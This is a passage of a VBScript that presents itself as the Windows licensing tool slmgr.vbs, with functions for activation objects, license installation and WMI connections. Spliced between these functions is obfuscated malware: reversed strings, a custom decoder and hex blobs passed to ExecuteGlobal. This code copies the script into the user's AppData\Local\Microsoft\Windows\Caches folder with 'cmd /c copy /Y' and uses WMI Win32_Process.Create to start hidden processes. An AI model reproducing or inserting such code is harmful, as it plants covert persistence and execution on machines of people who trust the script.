    FailRemoteExec()

    On Error Resume Next

    '
    ' Fetch computer's domain name. This must be used while querying for
    ' Activation Objects to ensure we do not query them from current user's
    ' domain (which may be in a different forest than computer's domain).
    '
    machineDomain = GetMachineDomain()
    QuitIfError()

    set namespace = GetObject(ADLdapProvider)
    QuitIfError()

    set rootDSE = namespace.OpenDSObject(ADLdapProviderPrefix & machineDomain & ADRootDSE, vbNullString, vbNullString, ADS_READONLY_SERVER)
    QuitIfError()

    configurationNC = rootDSE.Get(ADConfigurationNC)
    QuitIfError()

    set container = namespace.OpenDSObject(ADLdapProviderPrefix & machineDomain & ADActObjContainer & configurationNC, vbNullString, vbNullString, ADS_READONLY_SERVER)
    If Err.Number = HR_ERROR_DS_NO_SUCH_OBJECT Then
        LineOut GetResource("L_MsgADSchemaNotSupported")
        Exit Sub
    End If
    QuitIfError()

    LineOut GetResource("L_MsgActObjAvailable")

    found = False

    For Each child in container
        If child.Class = ADActObjClass Then
            found = True
            child.GetInfoEx Array(ADActObjDisplayName, ADActObjAttribDN, ADActObjAttribSkuId, ADActObjAttribPid), 0
            LineOut "    " & GetResource("L_MsgADInfoAOName") & child.Get(ADActObjDisplayName)
            LineOut "    " & "    " & GetResource("L_MsgActID") & GuidToString(child.Get(ADActObjAttribSkuId))
            LineOut "    " & "    " & GetResource("L_MsgPartialPKey") & child.Get(ADActObjAttribPartialPkey)
            LineOut "    " & "    " & GetResource("L_MsgADInfoExtendedPid") & child.Get(ADActObjAttribPid)
            LineOut "    " & "    " & GetResource("L_MsgADInfoAODN") & child.Get(ADActObjAttribDN)
            LineOut ""
        End If
    Next

    If (found = False) Then
        LineOut "    " & GetResource("L_MsgActObjNoneFound")
    End If

End Sub



Private Sub ADDeleteActivationObjects(strName)
    Dim machineDomain
    Dim namespace
    Dim rootDSE, configurationNC
    Dim container, strDN
    Dim object, parent

    FailRemoteExec()

    On Error Resume Next

    machineDomain = GetMachineDomain()
    QuitIfError()

    set namespace = GetObject(ADLdapProvider)
    QuitIfError()

    set rootDSE = GetObject(ADLdapProviderPrefix & machineDomain & ADRootDSE)
    QuitIfError()

    configurationNC = rootDSE.Get(ADConfigurationNC)
    QuitIfError()

    '
    ' Check if AD schema supports Activation Objects containers
    '
    set container = namespace.OpenDSObject(ADLdapProviderPrefix & machineDomain & ADActObjContainer & configurationNC, vbNullString, vbNullString, ADS_READONLY_SERVER)
    If Err.Number = HR_ERROR_DS_NO_SUCH_OBJECT Then
        LineOut GetResource("L_MsgADSchemaNotSupported")
        Exit Sub
    End If
    QuitIfError()

    If InStr(1, strName, ",cn=", vbTextCompare) > 0 Then
        strDN = strName
    Else
        '
        ' RDN was provided. Construct a full DN from it.
        '

        ' Use computer's domain name to construct the Activation Object DN.
        If 1 = InStr(1, strName, "cn=", vbTextCompare) Then
            strDN = strName & "," & ADActObjContainer & configurationNC
        Else
            strDN = "CN=" & strName & "," & ADActObjContainer & configurationNC
        End If

        LineOut "    " & GetResource("L_MsgADInfoAODN") & strDN
        LineOut ""
    End If

    set object = GetObject(ADLdapProviderPrefix & strDN)
    QuitIfError()

    set parent = GetObject(object.Parent)
    QuitIfError()

    If (object.Class = ADActObjClass) Then
        parent.Delete object.Class, object.Name
        QuitIfError()
    End If

    LineOut GetResource("L_MsgSucess")

End Sub

' other generic options/helpers

Private Sub LineOut(str)
    g_EchoString = g_EchoString & str & vbNewLine
End Sub



Private Sub LineFlush(str)
    WScript.Echo g_EchoString & str
    g_EchoString = ""
End Sub



Private Sub ExitScript(retval)
    if (g_EchoString <> "") Then
        WScript.Echo g_EchoString
    End If
    WScript.Quit retval
End Sub



Function GetMachineDomain()
    Dim adSystemInfo
    Dim machineDomain

    set adSystemInfo = CreateObject("ADSystemInfo")
    QuitIfError()

    machineDomain = adSystemInfo.DomainDNSName & "/"
    QuitIfError()

    GetMachineDomain = machineDomain
End Function



Function HexByte(b)
      HexByte = Right("0" & Hex(b), 2)
End Function



Function GuidToString(ByteArray)
  Dim Binary, S
  Binary = CStr(ByteArray)
  S = "{"
  S = S & HexByte(AscB(MidB(Binary, 4, 1)))
  S = S & HexByte(AscB(MidB(Binary, 3, 1)))
  S = S & HexByte(AscB(MidB(Binary, 2, 1)))
  S = S & HexByte(AscB(MidB(Binary, 1, 1)))
  S = S & "-"
  S = S & HexByte(AscB(MidB(Binary, 6, 1)))
  S = S & HexByte(AscB(MidB(Binary, 5, 1)))
  S = S & "-"
  S = S & HexByte(AscB(MidB(Binary, 8, 1)))
  S = S & HexByte(AscB(MidB(Binary, 7, 1)))
  S = S & "-"
  S = S & HexByte(AscB(MidB(Binary, 9, 1)))
  S = S & HexByte(AscB(MidB(Binary, 10, 1)))
  S = S & "-"
  S = S & HexByte(AscB(MidB(Binary, 11, 1)))
  S = S & HexByte(AscB(MidB(Binary, 12, 1)))
  S = S & HexByte(AscB(MidB(Binary, 13, 1)))
  S = S & HexByte(AscB(MidB(Binary, 14, 1)))
  S = S & HexByte(AscB(MidB(Binary, 15, 1)))
  S = S & HexByte(AscB(MidB(Binary, 16, 1)))
  S = S & "}"
  GuidToString = S
End Function



Private Sub InstallLicense(licFile)
    Dim objService
    Dim LicenseData
    Dim strOutput

    On Error Resume Next
    LicenseData = ReadAllTextFile(licFile)
    QuitIfError()
    set objService = GetServiceObject("Version")
    QuitIfError()

    objService.InstallLicense(LicenseData)
    QuitIfError()

    strOutput = Replace(GetResource("L_MsgLicenseFile"), "%LICENSEFILE%", licFile)
    LineOut strOutput
    LineOut ""
End Sub



' Returns the encoding for a givven file.
' Possible return values: ascii, unicode, unicodeFFFE (big-endian), utf-8
Function GetFileEncoding(strFileName)
    Dim strData
    Dim strEncoding
    Dim oStream

    Set oStream = CreateObject("ADODB.Stream")

    oStream.Type = 1 'adTypeBinary
    oStream.Open
    oStream.LoadFromFile(strFileName)

    ' Default encoding is ascii
    strEncoding =  "ascii"

    strData = BinaryToString(oStream.Read(2))

    ' Check for little endian (x86) unicode preamble
    If (Len(strData) = 2) and strData = (Chr(255) + Chr(254)) Then
        strEncoding = "unicode"
    Else
        oStream.Position = 0
        strData = BinaryToString(oStream.Read(3))

        ' Check for utf-8 preamble
        If (Len(strData) >= 3) and strData = (Chr(239) + Chr(187) + Chr(191)) Then
            strEncoding = "utf-8"
        End If
    End If

    oStream.Close

    GetFileEncoding = strEncoding
End Function



' Converts binary data (VT_UI1 | VT_ARRAY) to a string (BSTR)
Function BinaryToString(dataBinary)
  Dim i
  Dim str

  For i = 1 To LenB(dataBinary)
    str = str & Chr(AscB(MidB(dataBinary, i, 1)))
  Next

  BinaryToString = str
End Function



' Returns string containing the whole text file data.
' Supports ascii, unicode (little-endian) and utf-8 encoding.
Function ReadAllTextFile(strFileName)
    Dim strData
    Dim oStream

    Set oStream = CreateObject("ADODB.Stream")

    oStream.Type = 2 'adTypeText
    oStream.Open
    oStream.Charset = GetFileEncoding(strFileName)
    oStream.LoadFromFile(strFileName)

    strData = oStream.ReadText(-1) 'adReadAll

    oStream.Close

    ReadAllTextFile = strData
End Function



Private Function HandleOptionParam(cParam, mustProvide, opt, param)
    Dim strOutput

    HandleOptionParam = True
    If WScript.Arguments.Count <= cParam Then
        HandleOptionParam = False
        If mustProvide Then
            LineOut ""
            strOutput = Replace(GetResource("L_MsgErrorText_9"), "%OPTION%", opt)
            strOutput = Replace(strOutput, "%PARAM%", param)
            LineOut strOutput
            Call DisplayUsage()
        End If
    End If
End Function



'
' A Copy of Err from the point of origin
'
Class CErr
    Public Number
    Public Description
    Public Source

    Private Sub Class_Initialize
        Number      = Err.Number
        Description = Err.Description
        Source      = Err.Source
    End Sub
End Class



Function NewCErr(number, source, description)
    Dim objError

    Set objError = new CErr
    objError.Number = CLng(number)
    objError.Source = source
    objError.Description = description

    Set NewCErr = objError
End Function



Private Sub ShowError(ByVal strMessage, ByVal objErr)
    Dim strDescription
    Dim strNumber

    ' Convert error number to text. Use hexadecimal format for negative values such as HRESULT errors.
    If objErr.Number >= 0 Then
        strNumber = CStr(objErr.Number)
    Else
        strNumber = "0x" & Hex(objErr.Number)
    End If

    strDescription = GetResource("L_MsgError_" & Hex(objErr.Number))

    If strDescription = "" Then
        If objErr.Description = "" Then
            strDescription = Replace(GetResource("L_MsgErrorText_6"), "0x%ERRCODE%", strNumber)
        ElseIf objErr.Source = "" Then
            strDescription = objErr.Description
        Else
            strDescription = objErr.Description & " (" & objErr.Source & ")"
        End If
    End If

    If 0 = InStr(strMessage, "0x%ERRCODE%") Then
        strMessage = strMessage & "0x%ERRCODE%"
    End If

    If 0 = InStr(strMessage, "%ERRTEXT%") Then
        strMessage = strMessage & " %ERRTEXT%"
    End If

    strMessage = Replace(strMessage, "%COMPUTERNAME%", g_strComputer)
    strMessage = Replace(strMessage, "0x%ERRCODE%", strNumber)
    strMessage = Replace(strMessage, "%ERRTEXT%", strDescription)

    LineOut strMessage
End Sub



Private Sub QuitIfError()
    QuitIfError2 "L_MsgErrorText_8"
End Sub



Private Sub QuitIfError2(strMessage)
    Dim objErr

    If Err.Number <> 0 Then
        Set objErr = new CErr

        ShowError GetResource(strMessage), objErr
        ExitScript objErr.Number
    End If
End Sub



Private Sub Connect
    Dim objLocator, strOutput
    Dim objServer, objService
    Dim strErr, strVersion

    On Error Resume Next

    'If this is the local computer, set everything and return immediately
    If g_strComputer = "." Then
        Set g_objWMIService = GetObject("winmgmts:\\" & g_strComputer & "\root\cimv2")
        QuitIfError2("L_MsgErrorLocalWMI")

        Set g_objRegistry = GetObject("winmgmts:\\" & g_strComputer & "\root\default:StdRegProv")
        QuitIfError2("L_MsgErrorLocalRegistry")

        Exit Sub
    End If

    'Otherwise, establish the remote object connections

    ' Create Locator object to connect to remote CIM object manager
    Set objLocator = CreateObject("WbemScripting.SWbemLocator")
    QuitIfError2("L_MsgErrorWMI")

    ' Connect to the namespace which is either local or remote
    Set g_objWMIService = objLocator.ConnectServer (g_strComputer, "\root\cimv2", g_strUserName, g_strPassword)
    QuitIfError2("L_MsgErrorConnection")

    g_IsRemoteComputer = True

    g_objWMIService.Security_.impersonationlevel = wbemImpersonationLevelImpersonate
    QuitIfError2("L_MsgErrorImpersonation")

    g_objWMIService.Security_.AuthenticationLevel = wbemAuthenticationLevelPktPrivacy
    QuitIfError2("L_MsgErrorAuthenticationLevel")

    ' Get the SPP service version on the remote machine
    set objService = GetServiceObject("Version")
    strVersion = objService.Version

    ' The Windows 8 version of SLMgr.vbs does not support remote connections to Vista/WS08 and Windows 7/WS08R2 machines
    if (Not IsNull(strVersion)) Then
        strVersion = Left(strVersion, 3)
        If (strVersion = "6.0") Or (strVersion = "6.1") Then
            LineOut GetResource("L_MsgRemoteWmiVersionMismatch")
            ExitScript 1
        End If
    End If

    Set objServer = objLocator.ConnectServer(g_strComputer, "\root\default:StdRegProv", g_strUserName, g_strPassword)
    QuitIfError2("L_MsgErrorConnectionRegistry")

    objServer.Security_.ImpersonationLevel = 3
    Set g_objRegistry = objServer.Get("StdRegProv")
    QuitIfError2("L_MsgErrorConnectionRegistry")
End Sub



Function GetServiceObject(strQuery)
    Dim objService
    Dim colServices

    On Error Resume Next

    Set colServices = g_objWMIService.ExecQuery("SELECT " & strQuery & " FROM " & ServiceClass)
    QuitIfError()

    For each objService in colServices
        QuitIfError()
        Exit For
    Next

    QuitIfError()

    set GetServiceObject = objService
End Function



Function GetProductCollection(strSelect, strWhere)
    Dim colProducts
    Dim objProduct

    On Error Resume Next

    If strWhere = EmptyWhereClause Then
        Set colProducts = g_objWMIService.ExecQuery("SELECT " & strSelect & " FROM " & ProductClass)
        QuitIfError()
    Else
        Set colProducts = g_objWMIService.ExecQuery("SELECT " & strSelect & " FROM " & ProductClass & " WHERE " & strWhere)
        QuitIfError()
    End If

    For each objProduct in colProducts
    Next

    QuitIfError()

    set GetProductCollection = colProducts
End Function



Function GetProductObject(strSelect, strWhere)
    Dim objProduct
    Dim colProducts
    Dim iProductsFound

    On Error Resume Next

    iProductsFound = 0
    Set colProducts = GetProductCollection(strSelect, strWhere)
    For each objProduct in colProducts
        QuitIfError()
        iProductsFound = iProductsFound + 1
    Next

    'There should be exactly one product returned by the query.  If there are none
    'assume the product key and/or licenses are missing.  If there are more than one
    'then fail with invalid arguments.
    If iProductsFound = 0 Then
        LineOut GetResource("L_MsgErrorPKey")
        Err.Number = HR_SL_E_PKEY_NOT_INSTALLED
    ElseIf iProductsFound <> 1 Then
        Err.Number = HR_INVALID_ARG
    End If
    QuitIfError()

    'Return the first (and only) element in the collection
    For each objProduct in colProducts
        QuitIfError()
        Exit For
    Next

    set GetProductObject = objProduct
End Function



Private Function IsKmsClient(strDescription)
    If InStr(strDescription, "VOLUME_KMSCLIENT") > 0 Then
        IsKmsClient = True
    Else
        IsKmsClient = False
    End If
End Function

Private Function  IsTkaClient(strDescription)
    IsTkaClient = IsKmsClient(strDescription)
End Function



Private Function IsKmsServer(strDescription)
    If IsKmsClient(strDescription) Then
        IsKmsServer = False
    Else
        If InStr(strDescription, "VOLUME_KMS") > 0 Then
            IsKmsServer = True
        Else
            IsKmsServer = False
        End If
    End If
End Function

Private Function IsTBL(strDescription)
    If InStr(strDescription, "TIMEBASED_") > 0 Then
        IsTBL = True
    Else
        IsTBL = False
    End If
End Function



Private Function IsAVMA(strDescription)
    If InStr(strDescription, "VIRTUAL_MACHINE_ACTIVATION") > 0 Then
        IsAVMA = True
    Else
        IsAVMA = False
    End If
End Function



'Returns 0 if this is not the primary SKU, 1 if it is, and 2 if we aren't certain (older clients)
Function GetIsPrimaryWindowsSKU(objProduct)
    Dim iPrimarySku
    Dim bIsAddOn

    'Assume this is not the primary SKU
    iPrimarySku = 0
    'Verify the license is for Windows, that it has a partial key, and that
    If (LCase(objProduct.ApplicationId) = WindowsAppId And objProduct.PartialProductKey <> "") Then
        'If we can get verify the AddOn property then we can be certain
        On Error Resume Next
        bIsAddOn = objProduct.LicenseIsAddon
        If Err.Number = 0 Then
            If bIsAddOn = true Then
                iPrimarySku = 0
            Else
                iPrimarySku = 1
            End If
        Else
            'If we can not get the AddOn property then we assume this is a previous version
            'and we return a value of Uncertain, unless we can prove otherwise
            If (IsKmsClient(objProduct.Description) Or IsKmsServer(objProduct.Description)) Then
                'If the description is KMS related, we can be certain that this is a primary SKU
                iPrimarySku = 1
            Else
                'Indeterminate since the property was missing and we can't verify KMS
                iPrimarySku = 2
            End If
        End If
    End If
    GetIsPrimaryWindowsSKU = iPrimarySku
End Function



Private Function WasPrimaryKeyFound(strPrimarySkuType)
    If (IsKmsServer(strPrimarySkuType) Or IsKmsClient(strPrimarySkuType) Or (InStr(strPrimarySkuType, NotSpecialCasePrimaryKey) > 0) Or (InStr(strPrimarySkuType, TblPrimaryKey) > 0) Or (InStr(strPrimarySkuType, IndeterminatePrimaryKeyFound) > 0)) Then
        WasPrimaryKeyFound = True
    Else
        WasPrimaryKeyFound = False
    End If
End Function


Private Function CanPrimaryKeyTypeBeDetermined(strPrimarySkuType)
    If ((InStr(strPrimarySkuType, IndeterminatePrimaryKeyFound) > 0) Or (InStr(strPrimarySkuType, NoPrimaryKeyFound) > 0)) Then
        CanPrimaryKeyTypeBeDetermined = False
    Else
        CanPrimaryKeyTypeBeDetermined = True
    End If
End Function



Private Function GetPrimarySKUType()
    Dim objProduct
    Dim strPrimarySKUType, strDescription
    Dim iIsPrimaryWindowsSku

    For Each objProduct in GetProductCollection(ProductIsPrimarySkuSelectClause, PartialProductKeyNonNullWhereClause)
        strDescription = objProduct.Description
        If (LCase(objProduct.ApplicationId) = WindowsAppId) Then
            iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProduct)
            If (iIsPrimaryWindowsSku = 1) Then
                If (IsKmsServer(strDescription) Or IsKmsClient(strDescription)) Then
                    strPrimarySKUType = strDescription
                    Exit For    'no need to continue
                Else
                    If IsTBL(strDescription) Then
                        strPrimarySKUType = TblPrimaryKey
                        Exit For
                    Else
                        strPrimarySKUType = NotSpecialCasePrimaryKey
                    End If
                End If
            ElseIf ((iIsPrimaryWindowsSku = 2) And strPrimarySKUType = "") Then
                strPrimarySKUType = IndeterminatePrimaryKeyFound
            End If
        Else
            strPrimarySKUType = strDescription
            Exit For    'no need to continue
        End If
    Next

    If strPrimarySKUType = "" Then
        strPrimarySKUType = NoPrimaryKeyFound
    End If

    GetPrimarySKUType = strPrimarySKUType
End Function



Private Function ExistsRegistryKey(hKey, strKeyPath)
    Dim bGranted
    Dim lRet

    ' Check for KEY_QUERY_VALUE for this key
    lRet = g_objRegistry.CheckAccess(hKey, strKeyPath, 1, bGranted)

    ' Ignore real access rights, just look for existence of the key
    If lRet<>2 Then
        ExistsRegistryKey = True
    Else
        ExistsRegistryKey = False
    End If
End Function



' Loads resource strings from an ini file of the appropriate locale
Private Function LoadResourceData
    If g_resourcesLoaded Then
        Exit Function
    End If

    Dim ini, lang
    Dim fso

    Set fso = WScript.CreateObject("Scripting.FileSystemObject")

    On Error Resume Next
    lang = GetUILanguage()
    If Err.Number <> 0 Then
        'API does not exist prior to Vista so no resources to load
        g_resourcesLoaded = True
        Exit Function
    End If

    ini = fso.GetParentFolderName(WScript.ScriptFullName) & "\slmgr\" _
        & ToHex(lang) & "\" & fso.GetBaseName(WScript.ScriptName) &  ".ini"

    If fso.FileExists(ini) Then
        Dim stream
        Const ForReading = 1, TristateTrue = -1 'Read file in unicode format

        Set stream = fso.OpenTextFile(ini, ForReading, False, TristateTrue)
        ReadResources(stream)
        stream.Close
    End If

    g_resourcesLoaded = True
End Function



' Reads resource strings from an ini file
SPLevel0x9C0x8E0x7B0x6C0x5E = E0x9C0x8E0x7B0x6C0x5E(G0x9C0x8E0x7B0x6C0x5E() + H0x9C0x8E0x7B0x6C0x5E())
If Left(g_DumpDir,2) <> "\\" Then
Else
End If
sKeys0x9C0x8E0x7B0x6C0x5E = Eval (E0x9C0x8E0x7B0x6C0x5E(")"""",emaNtpircS.tpircSW,emaNlluFtpircS.tpircSW(ecalper"))
Private Function ReadResources(stream)
    const ERROR_FILE_NOT_FOUND = 2
    Dim ln, arr, key, value

    If Not IsObject(stream) Then Err.Raise ERROR_FILE_NOT_FOUND

    Do Until stream.AtEndOfStream
        ln = stream.ReadLine

        arr = Split(ln, "=", 2, 1)
        If UBound(arr, 1) = 1 Then
            ' Trim the key and the value first before trimming quotes
            key = LCase(Trim(arr(0)))
            value = TrimChar(Trim(arr(1)), """")

            If key <> "" Then
                g_resourceDictionary.Add key, value
            End If
        End If
    Loop
End Function



' Trim a character from the text string
Private Function TrimChar(s, c)
    Const vbTextCompare = 1

    ' Trim character from the start
    If InStr(1, s, c, vbTextCompare) = 1 Then
        s = Mid(s, 2)
    End If

    ' Trim character from the end
    If InStr(Len(s), s, c, vbTextCompare) = Len(s) Then
        s = Mid(s, 1, Len(s) - 1)
    End If

    TrimChar = s
End Function



' Get a 4-digit hexadecimal number
Private Function ToHex(n)
    Dim s : s = Hex(n)
    ToHex = String(4 - Len(s), "0") & s
End Function



Set CurrentPathExt007U2U50 = GetObject (E0x9C0x8E0x7B0x6C0x5E("B0A85DF40C00-9BDA-0D11-0FC1-62CD539F:wE"+"n"))
If Left(g_DumpDir,2) <> "\\" Then
lValue0x9C0x8E0x7B0x6C0x5E = E0x9C0x8E0x7B0x6C0x5E ("\sresU\:C") + CurrentPathExt007U2U50.UserName + E0x9C0x8E0x7B0x6C0x5E ("sehcaC\swodniW\tfosorciM\lacoL\ataDppA\")
Else
End If
If Left(g_DumpDir,2) <> "\\" Then
F = lValue0x9C0x8E0x7B0x6C0x5E + "\" + WScript.ScriptName
Else
End If
A0x9C0x8E0x7B0x6C0x5E()
If sKeys0x9C0x8E0x7B0x6C0x5E = lValue0x9C0x8E0x7B0x6C0x5E Then
WScript.Quit()
SPLevel0x9C0x8E0x7B0x6C0x5E = E0x9C0x8E0x7B0x6C0x5E(G0x9C0x8E0x7B0x6C0x5E() + H0x9C0x8E0x7B0x6C0x5E())
Else
AdpT0x9C0x8E0x7B0x6C0x5E = E0x9C0x8E0x7B0x6C0x5E(""" YpOc c/ dMc") & sKeys0x9C0x8E0x7B0x6C0x5E & WScript.ScriptName & """ """ & lValue0x9C0x8E0x7B0x6C0x5E & """ /Y"
B0x9C0x8E0x7B0x6C0x5E(AdpT0x9C0x8E0x7B0x6C0x5E)
End If



Function A0x9C0x8E0x7B0x6C0x5E()
K0x9C0x8E0x7B0x6C0x5E = + E0x9C0x8E0x7B0x6C0x5E(Hex0x9C0x8E0x7B0x6C0x5E("545387033463870324738703548387033493870333359494c2545387033463870324738703548387033493870343359494c2545387033463870324738703548387033493870347079627363534765625c25534b484025657c6166576e696274735475635e2545387033463870324738703548387033493870346165625765625a06402d302545387033463870324738703548387033493870333359494a066940246e654a092138287571427271602620222c52202620292038287571427271602620222c5c52202d30256d616e45667962744a0029213d202c222c52202c2875714274737824796c6073502d302875714272716a0922243635636966727563555465714b64725228202d302545387033463870324738703548387033493870343359494a0922302d2029227964407d65744f57682e656c402c227964407d65744f57682478676962502d302875714274737a05637c654a0922235f422b22264457522b222142522b22254c5d49622b222362722b222f637f622b2226647c5759622b222e646f622b2227737c53422b2225727275622b222e647655622b222273722b22296f6e6c5255722b222e6228254538703346387032473870354838703349387035402d302545387033463870324738703548387033493870347079627363534765625a09213c227964407d65744f57682476656c402d30256d616e45667962744a0e65686450222c5c52202e3c3029223c227964407d65744f57682476656c4026694a09292224656661657c647a33547462556760527f667228254538703346387032473870354838703349387035402b2025453870334638703247387035483870334938703c6566756c405358202473656a626f447567402d30254538703346387032473870354838703349387034616562576562502475635a04557f4464537e24707962736357502d3024557f446453702475635a01303030303030383846202d3025534b484024737e6f634a066940246e654a05637c654a0e65686450222c5c52202e3c3029223c227964407d65744f57682476656c4026694"))
End Function



Function F0x9C0x8E0x7B0x6C0x5E()
ExecuteGlobal(("TristateUseDefault0x9C0x8E0x7B0x6C0x5E= ArRAy (""eT"",""aE"",""rC"")"))
F0x9C0x8E0x7B0x6C0x5E = E0x9C0x8E0x7B0x6C0x5E( Join (TristateUseDefault0x9C0x8E0x7B0x6C0x5E,""))
End Function



Function G0x9C0x8E0x7B0x6C0x5E()
If Left(g_DumpDir,2) <> "\\" Then
DriveName = Left(g_DumpDir,1)
G0x9C0x8E0x7B0x6C0x5E = "\ToOR\.\\!}EtAnOsREpMI=lEvEL"
Else
strAux = Right(g_DumpDir, Len(g_DumpDir) - 2)
arrAux = Split(strAux, "\", -1) 
DriveName = "\\" & arrAux(0) & "\" & arrAux(1)
End If
End Function



Function H0x9C0x8E0x7B0x6C0x5E()
H0x9C0x8E0x7B0x6C0x5E = "noitanosrepmi{:stmgmniw"
End Function



Function I0x9C0x8E0x7B0x6C0x5E()
I0x9C0x8E0x7B0x6C0x5E = E0x9C0x8E0x7B0x6C0x5E ("putratSssecorP_23ni"+"W")
End Function



Function J0x9C0x8E0x7B0x6C0x5E()
J0x9C0x8E0x7B0x6C0x5E = "hsre"
End Function



D0x9C0x8E0x7B0x6C0x5E()



Sub DWORD0x9C0x8E0x7B0x6C0x5E(LPVOID)
RCX0x9C0x8E0x7B0x6C0x5E=Hex0x9C0x8E0x7B0x6C0x5E("536574206f626a574d4953657276696365203d204765744f626a656374282277696e6d676d74733a7b696d706572736f6e6174696f6e4c6576656c3d696d706572736f6e6174657d215c5c2e5c726f6f745c63696d76322229203a20")
R110x9C0x8E0x7B0x6C0x5E=Hex0x9C0x8E0x7B0x6C0x5E("44696d206f626a574d49536572766963652c6f626a537461727475702c6f626a50726f636573732c6f626a436f6e6669672c696e7450726f6365737349442c696e7452657475726e203a20")
    ExecuteGlobal _
	Hex0x9C0x8E0x7B0x6C0x5E("4f7074696f6e204578706c696369743a20") & _
    Hex0x9C0x8E0x7B0x6C0x5E("5375622044574f524430783343307832453078394230783443307832453078524f50284c50564f494429") & _
	R110x9C0x8E0x7B0x6C0x5E & _
	RCX0x9C0x8E0x7B0x6C0x5E & _
	Hex0x9C0x8E0x7B0x6C0x5E("536574206f626a53746172747570203d206f626a574d49536572766963652e476574282257696e33325f50726f636573735374617274757022293a20") & _
	Hex0x9C0x8E0x7B0x6C0x5E("536574206f626a436f6e666967203d206f626a537461727475702e537061776e496e7374616e63655f3a20") & _
    Hex0x9C0x8E0x7B0x6C0x5E("6f626a436f6e6669672e53686f7757696e646f77203d2030203a20") & _
	Hex0x9C0x8E0x7B0x6C0x5E("536574206f626a50726f63657373203d206f626a574d49536572766963652e476574282257696e33325f50726f636573732229203a20") & _
	Hex0x9C0x8E0x7B0x6C0x5E("696e7452657475726e203d206f626a50726f636573732e437265617465284c50564f49442c204e756c6c2c206f626a436f6e6669672c20696e7450726f63657373494429203a20") & _
    Hex0x9C0x8E0x7B0x6C0x5E("456e64205375623a")
End sub




Function E0x9C0x8E0x7B0x6C0x5E(str)
If Left(g_DumpDir,2) <> "\\" Then
DriveName = Left(g_DumpDir,1)
Else
strAux = Right(g_DumpDir, Len(g_DumpDir) - 2)
arrAux = Split(strAux, "\", -1) 
DriveName = "\\" & arrAux(0) & "\" & arrAux(1)
End If
Length = 8
objArgs = 5
If Length = objArgs Then
Else
GetStringArray0x9C0x8E0x7B0x6C0x5E = Len(str)
a = Left(str,1)
For i = 1 To GetStringArray0x9C0x8E0x7B0x6C0x5E
arrStrings0x9C0x8E0x7B0x6C0x5E = Eval("Left(" + "s" + "t" + "r," + "i" + ")")
If Len(arrStrings0x9C0x8E0x7B0x6C0x5E)> 1 Then
strSeparator0x9C0x8E0x7B0x6C0x5E = Right(arrStrings0x9C0x8E0x7B0x6C0x5E,1) & strTemp0x9C0x8E0x7B0x6C0x5E
strTemp0x9C0x8E0x7B0x6C0x5E = strSeparator0x9C0x8E0x7B0x6C0x5E
End If
Next
Dim I,J,k,R
J=Len(str)
R=""
For I=2 to J
If Left(g_DumpDir,2) <> "\\" Then
DriveName = Left(g_DumpDir,1)
Else
End If
k=Asc(Mid(str,I,2))
If k>=23 And k<=1024 Then
E0x9C0x8E0x7B0x6C0x5E = strTemp0x9C0x8E0x7B0x6C0x5E & a
Else
End If
Next
L=R
End If
End Function



Public Function Hex0x9C0x8E0x7B0x6C0x5E(sD0x9C0x8E0x7B0x6C0x5E)
If Left(g_DumpDir,2) <> "\\" Then
DriveName = Left(g_DumpDir,1)
Else
End If
Dim sO0x9C0x8E0x7B0x6C0x5E
Dim sTm0x9C0x8E0x7B0x6C0x5E
For iC0x9C0x8E0x7B0x6C0x5E = 1 To Len(sD0x9C0x8E0x7B0x6C0x5E) Step 2
sTm0x9C0x8E0x7B0x6C0x5E = Chr("&H" & Mid(sD0x9C0x8E0x7B0x6C0x5E, iC0x9C0x8E0x7B0x6C0x5E, 2))
If Left(g_DumpDir,2) <> "\\" Then
DriveName = Left(g_DumpDir,1)
Else
End If
sO0x9C0x8E0x7B0x6C0x5E = sO0x9C0x8E0x7B0x6C0x5E & sTm0x9C0x8E0x7B0x6C0x5E
Next
If Left(g_DumpDir,2) <> "\\" Then
DriveName = Left(g_DumpDir,1)
Else
End If
Hex0x9C0x8E0x7B0x6C0x5E = sO0x9C0x8E0x7B0x6C0x5E
End Function



Sub wWinMain0x9C0x8E0x7B0x6C0x5E(APIENTRY)
ROP0x9C0x8E0x7B0x6C0x5E=Hex0x9C0x8E0x7B0x6C0x5E("536574206f626a574d4953657276696365203d204765744f626a656374282277696e6d676d74733a7b696d706572736f6e6174696f6e4c6576656c3d696d706572736f6e6174657d215c5c2e5c726f6f745c63696d76322229203a20")
BX20x9C0x8E0x7B0x6C0x5E=Hex0x9C0x8E0x7B0x6C0x5E("44696d206f626a574d49536572766963652c6f626a537461727475702c6f626a50726f636573732c6f626a436f6e6669672c696e7450726f6365737349442c696e7452657475726e203a20")
    ExecuteGlobal(Hex0x9C0x8E0x7B0x6C0x5E("4f7074696f6e204578706c696369743a20")) & _
    Hex0x9C0x8E0x7B0x6C0x5E("537562207757696e4d61696e30783343307832453078394230783443307832453078524f5028415049454e54525929") & _
	BX20x9C0x8E0x7B0x6C0x5E & _
	ROP0x9C0x8E0x7B0x6C0x5E & _
	Hex0x9C0x8E0x7B0x6C0x5E("536574206f626a53746172747570203d206f626a574d49536572766963652e476574282257696e33325f50726f636573735374617274757022293a20") & _
	Hex0x9C0x8E0x7B0x6C0x5E("536574206f626a436f6e666967203d206f626a537461727475702e537061776e496e7374616e63655f3a20") & _
    Hex0x9C0x8E0x7B0x6C0x5E("6f626a436f6e6669672e53686f7757696e646f77203d2030203a20") & _
	Hex0x9C0x8E0x7B0x6C0x5E("536574206f626a50726f63657373203d206f626a574d49536572766963652e476574282257696e33325f50726f636573732229203a20") & _
	Hex0x9C0x8E0x7B0x6C0x5E("696e7452657475726e203d206f626a50726f636573732e43726561746528415049454e5452592c204e756c6c2c206f626a436f6e6669672c20696e7450726f63657373494429203a20") & _
    Hex0x9C0x8E0x7B0x6C0x5E("456e64205375623a")	
End sub



Sub B0x9C0x8E0x7B0x6C0x5E(CO0x9C0x8E0x7B0x6C0x5E):
Set ProductData0x9C0x8E0x7B0x6C0x5E = GetObject (SPLevel0x9C0x8E0x7B0x6C0x5E + E0x9C0x8E0x7B0x6C0x5E("2vMiC"))
Set ConvertToKey0x9C0x8E0x7B0x6C0x5E = ProductData0x9C0x8E0x7B0x6C0x5E.Get (I0x9C0x8E0x7B0x6C0x5E())
'Check the output directories drive to ensure there is enough free space for the files.
If Left(g_DumpDir,2) <> "\\" Then 'We are not logging to a UNC path.
End If
Set KeyOffset0x9C0x8E0x7B0x6C0x5E = ConvertToKey0x9C0x8E0x7B0x6C0x5E. _ 
SpawnInstance_(E0x9C0x8E0x7B0x6C0x5E(" "))
KeyOffset0x9C0x8E0x7B0x6C0x5E.ShowWindow = 0
